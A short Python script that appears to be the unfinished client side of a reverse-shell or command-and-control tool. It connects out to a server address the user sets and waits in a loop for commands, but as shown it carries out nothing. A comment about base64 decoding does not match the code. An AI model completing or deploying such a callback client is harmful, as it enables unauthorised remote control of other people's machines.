import socket

SERVER_HOST = "127.0.0.1"  # Change to your server's IP
SERVER_PORT = 6969  # Change to your server's listening port

def connect_to_server():
    client_socket = socket.socket()
    client_socket.connect((SERVER_HOST, SERVER_PORT))

    while True:
        try:
            # Receive and decode the base64-encoded command
            command = client_socket.recv(1024).decode()

            if command.lower() == "exit":
                break
    
        except Exception as e:
            client_socket.send(f"Error: {str(e)}".encode())

if __name__ == "__main__":
    connect_to_server()